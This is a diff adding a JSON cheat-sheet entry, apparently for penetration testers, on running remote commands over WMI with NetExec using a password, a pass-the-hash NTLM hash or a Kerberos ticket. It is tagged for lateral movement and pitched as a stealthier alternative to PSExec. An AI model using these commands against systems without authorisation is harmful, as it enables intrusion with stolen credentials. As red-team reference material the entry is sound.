@@ -1,0 +1,21 @@
+{
+  "id": "nxc-wmi-exec",
+  "name": "NetExec WMI Command Execution",
+  "command": "nxc wmi <ip> -u <user> -p <password> -x '<command>'",
+  "description": "Execute a command on a Windows host over WMI. WMI exec is often allowed in environments where SMB / WinRM is locked down and is a useful stealthier alternative to PSExec.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["wmi"],
+  "tags": ["nxc", "netexec", "wmi", "execution", "lateral-movement"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "nxc wmi <ip> -u <user> -H <hash> -x '<command>'" },
+    { "label": "Kerberos (ccache)", "requires": "ticket", "command": "KRB5CCNAME=<ccache> nxc wmi <ip> -u <user> -k --use-kcache -x '<command>'" }
+  ],
+  "references": [
+    { "title": "NetExec — WMI Protocol", "url": "https://www.netexec.wiki/wmi-protocol" }
+  ],
+  "examples": [
+    "nxc wmi 10.10.10.10 -u administrator -p 'Password123!' -x 'whoami /priv'",
+    "nxc wmi 10.10.10.10 -u admin -H :e19ccf75ee54e06b06a5907af13cef42 -x 'tasklist /v'"
+  ]
+}
